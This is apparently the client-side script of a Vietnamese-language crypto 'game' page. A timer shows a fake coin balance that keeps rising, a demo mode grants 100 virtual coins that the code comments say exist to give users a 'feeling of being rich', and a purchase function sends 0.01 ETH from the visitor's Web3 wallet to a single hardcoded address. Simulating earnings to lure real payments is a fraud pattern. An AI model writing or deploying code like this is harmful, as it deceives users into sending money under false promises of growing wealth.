const masterWallet = "0xcE9caBC82bce143601E0A097fF15A69385610B88";
let xuBalance = 0;

// Giả lập Lực F thu gom Xu Trường
setInterval(() => {
    xuBalance += 0.000157; // Tích tiểu thành đại
    document.getElementById('xu-balance').innerText = xuBalance.toFixed(6);
}, 2000);

function playDemo() {
    alert("CHẾ ĐỘ CHƠI THỬ KÍCH HOẠT: Bạn đang bước vào Framework Trường Core. Lực F đang thu gom tài sản cho bạn...");
    document.getElementById('seed').style.background = "radial-gradient(circle, #fff, #8e44ad)";
    xuBalance += 100; // Tặng vốn ảo để trải nghiệm cảm giác giàu sang
    alert("Hệ thống ISOA-V2026 đã tặng bạn 100 Xu Trường làm vốn tích lũy!");
}

async function connectAndBuy() {
    // Giữ nguyên logic thanh toán ETH như cũ nhưng dùng masterWallet đã lưu
    if (typeof window.ethereum !== 'undefined') {
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const tx = { to: masterWallet, value: ethers.utils.parseEther("0.01") };
            alert("Đang kết nối cổng thanh toán thật...");
            await signer.sendTransaction(tx);
        } catch (e) { alert("Lỗi: " + e.message); }
    } else { alert("Vui lòng cài đặt ví Web3!"); }
}
